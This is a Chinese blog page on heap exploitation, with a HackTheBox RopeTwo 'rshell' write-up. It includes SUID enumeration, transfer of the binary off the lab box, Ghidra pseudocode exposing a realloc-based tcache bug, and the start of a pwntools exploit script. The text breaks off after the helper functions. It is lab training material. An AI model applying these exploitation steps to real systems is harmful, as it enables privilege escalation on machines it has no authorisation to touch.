---
title: UAF、tcache 与分配器状态
url: https://lucifer11.xyz/knowledge/heap/
source: 0xfd's blog
date: 2026-11-25
fetch_date: 2026-11-26T10:13:55.086167
---

# UAF、tcache 与分配器状态

![0xfd's blog](/images/fifteen-katana-zero-katana-zero.gif)
[0xfd's blog](/)

by 0xfd

* [首页](/)
* [知识库](/knowledge/)
* [导读](/guide/)
* [分类](/categories/)
* [标签](/tags/)
* [归档](/archives/)
* [关于](/about/)
* 搜索

* 文章目录
* 站点概览

1. [分析重点](#%E5%88%86%E6%9E%90%E9%87%8D%E7%82%B9)
2. [案例与技术索引](#%E6%A1%88%E4%BE%8B%E4%B8%8E%E6%8A%80%E6%9C%AF%E7%B4%A2%E5%BC%95)
3. [realloc 状态与 tcache 指针](#realloc-%E7%8A%B6%E6%80%81%E4%B8%8E-tcache-%E6%8C%87%E9%92%88)
4. [悬空账户指针与 memo 重用](#%E6%82%AC%E7%A9%BA%E8%B4%A6%E6%88%B7%E6%8C%87%E9%92%88%E4%B8%8E-memo-%E9%87%8D%E7%94%A8)
5. [格式化泄漏与 tcache poisoning](#%E6%A0%BC%E5%BC%8F%E5%8C%96%E6%B3%84%E6%BC%8F%E4%B8%8E-tcache-poisoning)

![253](/images/fifteen-katana-zero-katana-zero.gif)

253

漏洞分析、利用机制、二进制研究与安全工程

[83
日志](/archives/)

[65
分类](/categories/)

[312
标签](/tags/)

GitHub

E-Mail

Twitter

FB Page

YouTube

Instagram

infosec.exchange

![Creative Commons](https://cdnjs.cloudflare.com/ajax/libs/creativecommons-vocabulary/2020.11.3/assets/license_badges/big/by_nc_sa.svg)

0%

链接

* atsud0
* 记忆里的纯真
* 小离

# UAF、tcache 与分配器状态

发表于
2026-11-25

分类于

[二进制安全](/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/)
，
[堆利用](/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/%E5%A0%86%E5%88%A9%E7%94%A8/)

阅读次数：

本文字数：
15k

阅读时长 ≈
54 分钟

堆利用首先需要理解对象生命周期和分配器状态。本章保留释放、重分配、别名指针和泄漏位置的原始顺序，再对照最后的 Python 脚本和远程结果。

堆利用首先需要理解对象生命周期和分配器状态。本章保留释放、重分配、别名指针和泄漏位置的原始顺序，再对照最后的 Python 脚本和远程结果。

[知识库目录](/knowledge/)
[研究导读](/guide/)
[下载 Markdown](/knowledge/heap/source.md)
展开全部技术记录

## 分析重点

Little Tommy 用 memo 重用已释放账户，字段布局决定覆盖内容。

RopeTwo rshell 的 realloc 与不同 bin 间距改变原语的可组合方式。

Toxin 的两个解法保留格式化泄漏、tcache poisoning 和 libc hook 的各自偏移。

## 案例与技术索引

| 分析入口 | 实验来源 | 技术点 |
| --- | --- | --- |
| [realloc 状态与 tcache 指针](#case-hackthebox-rope2-rshell-exploit) | hackthebox-rope2-rshell-exploit | 堆利用、tcache、libc |
| [悬空账户指针与 memo 重用](#case-little-tommy) | little-tommy | UAF、堆利用 |
| [格式化泄漏与 tcache poisoning](#case-toxin) | toxin | 堆利用、tcache、UAF、格式化字符串 |

## realloc 状态与 tcache 指针

rshell 的编辑和分配状态使多个句柄指向同一块内存。原记录保留不同 bin 大小、main\_arena 泄漏和脚本重构后的最终布局。

来源 hackthebox-rope2-rshell-exploit · 原记录 2021-02-18 · 58 个代码块 · 3 处图片引用

查看分析过程、攻击步骤与完整代码

#### 前言

此篇文章专门记录hack the box - ropetwo机器中获取user权限的pwn rshell部分, Tcache堆利用。

#### 下载binary文件分析

|  |  |
| --- | --- |
| ``` 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 ``` | ``` chromeuser@rope2:~$ find / -perm -u=s -type f 2>/dev/null /usr/lib/openssh/ssh-keysign /usr/lib/eject/dmcrypt-get-device /usr/lib/dbus-1.0/dbus-daemon-launch-helper /usr/bin/newgrp /usr/bin/fusermount /usr/bin/rshell /usr/bin/mount /usr/bin/at /usr/bin/chfn /usr/bin/passwd /usr/bin/gpasswd /usr/bin/umount /usr/bin/chsh /usr/bin/su /usr/bin/sudo chromeuser@rope2:~$ /usr/bin/rshell $ id uid=1000(r4j) gid=1000(r4j) groups=1000(r4j) $ whoami r4j $ ls $ pwd rshell: pwd: command not found $ ^C chromeuser@rope2:~$ ``` |

下载rshell文件

|  |  |
| --- | --- |
| ``` 1 2 3 ``` | ``` chromeuser@rope2:/usr/bin$ python3 -m http.server 8001 Serving HTTP on 0.0.0.0 port 8001 (http://0.0.0.0:8001/) ... 10.10.14.22 - - [17/Feb/2021 19:33:30] "GET /rshell HTTP/1.1" 200 - ``` |

|  |  |
| --- | --- |
| ``` 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 ``` | ``` ┌──(root💀kali)-[~/hackthebox/machine/rope2] └─# wget http://10.10.10.196:8001/rshell --2021-02-17 14:30:38--  http://10.10.10.196:8001/rshell 正在连接 10.10.10.196:8001... 已连接。 已发出 HTTP 请求，正在等待回应... 200 OK 长度：14312 (14K) [application/octet-stream] 正在保存至: “rshell”  rshell                             100%[===============================================================>]  13.98K  45.0KB/s  用时 0.3s      2021-02-17 14:30:39 (45.0 KB/s) - 已保存 “rshell” [14312/14312])  ┌──(root💀kali)-[~/hackthebox/machine/rope2] └─# ls -la rshell -rw-r--r-- 1 root root 14312  2月 24  2020 rshell ``` |

#### 主要循环

使用Ghidra打开看了看。在搜索字符串“command not found” 时，定位在0x1019be处的函数，将其命名为process\_input。调用这个函数的函数是0x101b93，将调用main\_loop

使用ghidra重命名函数名和变量名之后的伪代码如下所示，便于阅读:

|  |  |
| --- | --- |
| ``` 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 ``` | ``` void main_loop(void)  {   ssize_t i;   long in_FS_OFFSET;   byte in_buf [200];   undefined8 canary;      canary = *(undefined8 *)(in_FS_OFFSET + 0x28);   init_stuff();   memset(in_buf,0,200);   do {     do {       printf("$ ");       i = read(0,in_buf,199);     } while ((int)i < 2);     in_buf[(int)i + -1] = 0;     process_input(in_buf);   } while( true ); } ``` |

它初始化一些东西，然后进入一个无限循环，打印$，读取最多200个字符，null结束输入，并将其传递给process\_input, process\_input根据输入中的前几个字符采取行动:

| 输入开始 | 采取动作 |
| --- | --- |
| “ls “ | 调用 do\_ls [0x1015cf] |
| “add “ | 调用 do\_add(user\_input[4:]) [0x101345] |
| “rm “ | 调用 do\_rm(user\_input[3:]) [0x10166d] |
| “echo “ | 输出字符串的其余部分 |
| “edit “ | 调用 do\_edit(user\_input[5:]) [0x1017d8] |
| “whoami” | 打印 “r4j” |
| “id” | 打印 “uid=1000(r4j) gid=1000(r4j) groups=1000(r4j)” |
| 其它 | 打印 “rshell: %s: command not found” |

#### Commands

该程序一次最多保存两个“文件”，其中file1 on是0x104060的全局文件，file2是0x104130。对于每个文件，前8个字节包含一个指向用户提供的包含文件内容的malloc创建的堆缓冲区的指针。有一种检查只允许大小小于或等于0x70字节。最后一个0xC8(200)字节保存文件的名称。add函数确保第二个文件不能与现有文件同名，并且不能添加超过两个文件。这将是利用该二进制文件的最大限制，因为每次只使用两个文件就很难将堆操作到您想要的位置。

ls命令在两个槽上循环，如果指针非空，它将打印文件的名称。它不打印任何内容，而且无法合法地获取文件的内容，这为开发提供了另一个需要克服的主要障碍。

rm命令在两个槽上循环，查看偏移量为8的字符串，如果字符串与输入匹配，则将字符串文件名全部设置为null，释放包含内容的堆内存，并将指针设置为null。

edit命令是漏洞存在的地方。

使用ghidra将FUN\_001017d8函数中各个变量命名成如下形式，便于阅读:

|  |  |
| --- | --- |
| ``` 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 ``` | ``` void do_edit(char *param_1)  {   int strcmp_res;   long in_FS_OFFSET;   uint read_size;   int i;   void *new_buf;   long canary;      canary = *(long *)(in_FS_OFFSET + 0x28);   i = 0;   do {     if (1 < i) {       puts("rshell: No such file or directory"); LAB_001019a8:       if (canary != *(long *)(in_FS_OFFSET + 0x28)) {                     /* WARNING: Subroutine does not return */         __stack_chk_fail();       }       return;     }     strcmp_res = strcmp(param_1,(char *)((long)i * 0xd0 + 0x104068));     if ((strcmp_res == 0) && ((&item_array)[(long)i * 0x1a] != 0)) {       read_size = 0;       printf("size: ");       __isoc99_scanf(&"%u",&read_size);       getchar();       if (read_size < 0x71) {         new_buf = realloc((void *)(&item_array)[(long)i * 0x1a],(ulong)read_size);         if (new_buf == (void *)0x0) {           puts("Error");         }         else {           *(void **)(&item_array + (long)i * 0x1a) = new_buf;           printf("content: ");           read(0,(void *)(&item_array)[(long)i * 0x1a],(ulong)read_size);         }       }       else {         puts("Memory Error!");       }       goto LAB_001019a8;     }     i = i + 1;   } while( true ); } ``` |

这个循环首先检查i是否大于1，这表示它已经遍历了两个配置，但没有找到要编辑的匹配文件，在这种情况下，它打印一条错误消息并退出。然后，它检查当前项，看看名称是否与输入匹配，如果匹配，它会提示输入一个新的大小(确保小于0x71)，并在现有缓冲区上使用realloc。然后读取并存储内容，并完成。

#### 配置

* 利用脚本

为了与这个二进制文件交互，使用一些工具。首先，启动一个Python利用脚本。首先，它将只有与rshell中的各种命令交互的方法(这个脚本假设我的ssh公钥在chromeuser的authorized\_keys文件中):

* exp.py

|  |  |
| --- | --- |
| ``` 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 ``` | ``` #!/usr/bin/env python3  import pdb from pwn import *   prompt = '$ '  def ls():     p.sendline('ls')     res = p.recvuntil(prompt)     for line in res.split(b'\n')[:-1]:         print(line.decode())  def add(name, size, content='x'):     p.sendline(f'add {name}')     res = p.recvuntil(('size: ', prompt))     if res.endswith(prompt.encode()):          pdb.set_trace()         return     p.sendline(f'{size}')     if size > 0:         p.recvuntil('content: ')         p.sendline(content)     res = p.recvuntil(prompt)     return res       def rm(name, wait=True):     p.sendline(f'rm {name}')     if wait:         p.recvuntil(prompt)  def edit(name, size, content='x'):     p.sendline(f'edit {name}')     res = p.recvuntil(('size: ', prompt))     if res == prompt:          pdb.set_trace()         return   ...